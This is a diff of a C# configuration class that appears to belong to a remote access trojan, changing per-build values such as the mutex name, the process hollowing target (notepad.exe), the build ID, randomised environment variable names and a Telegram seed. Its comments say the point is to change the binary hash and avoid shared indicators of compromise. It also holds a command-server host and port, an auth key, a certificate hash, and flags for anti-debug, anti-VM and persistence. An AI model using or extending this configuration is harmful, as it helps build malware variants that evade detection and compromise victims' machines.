@@ -5,7 +5,7 @@ internal static class Config
     public static readonly string[] Hosts = new[] { "localhost" };
     public const int Port = 5555;
     public const bool UseMutex = true;
-    public const string MutexName = "Global\\5fe9ea361b254ab9b9084738898fd747";
+    public const string MutexName = "Global\\11636acc229e428197e0d4dd6c11fbd0";
 
     public const bool AntiDebug = false;
     public const bool AntiVM = false;
@@ -22,20 +22,20 @@ internal static class Config
     public const bool AntiKill = false;
     public const bool EnableWatchdog = false;
     public const bool EnableHollowing = true;
-    public const string HollowTarget = "dllhost.exe";
+    public const string HollowTarget = "notepad.exe";
 
     public const string AuthKey = "tWMi3vNzAmgj0cqlzeEq9of00pe+fjR7";
     public const string CertHash = "07AAB3993AEFC4F6B065B04E1EDA9E20E14649C3852D7079A852B421534AB423";
 
     // Unique per build — changes the compiled binary hash even with identical settings
-    public const string BuildId = "425667d314744cdbb006c490f80675c3";
+    public const string BuildId = "c633613605b146dba0d0691dcc650a81";
 
     // Per-build env var names — randomized so no two builds share the same IoC strings
-    public const string EnvKeyHollow        = "QyCGWpx8eC";
-    public const string EnvKeyPersistWorker = "D9hdIpEfAl";
-    public const string EnvKeyRelaunch      = "6vjqFQrjWw";
-    public const string EnvKeyExe           = "rN24Xwhywc";
-    public const string EnvKeyGuardian      = "fNJCJ6mJrk";
+    public const string EnvKeyHollow        = "eeqU7l5py0";
+    public const string EnvKeyPersistWorker = "BFQrVAK3Qv";
+    public const string EnvKeyRelaunch      = "zQ3jfhXnrj";
+    public const string EnvKeyExe           = "uuECNUnPwh";
+    public const string EnvKeyGuardian      = "OXsvEpjq0m";
 
     public const int ReconnectDelayMs = 5000;
     public const int HeartbeatIntervalMs = 3000;
@@ -56,5 +56,5 @@ internal static class Config
     public static readonly byte[] TelegramTokenSfc   = new byte[] {  };
     public static readonly byte[] TelegramChatId1Sfc = new byte[] {  };
     public static readonly byte[] TelegramChatId2Sfc = new byte[] {  };
-    public static readonly byte[] TelegramSfcSeed    = new byte[] { 30, 107, 54, 25, 243, 231, 82, 18, 131, 98, 253, 8, 159, 155, 84, 247, 96, 105, 132, 234, 235, 67, 22, 235, 122, 217, 187, 184, 32, 119, 37, 43 };
+    public static readonly byte[] TelegramSfcSeed    = new byte[] { 79, 144, 101, 247, 143, 109, 255, 39, 185, 117, 160, 206, 96, 224, 122, 213, 5, 115, 219, 81, 60, 0, 108, 98, 243, 186, 77, 228, 44, 99, 107, 131 };
 }
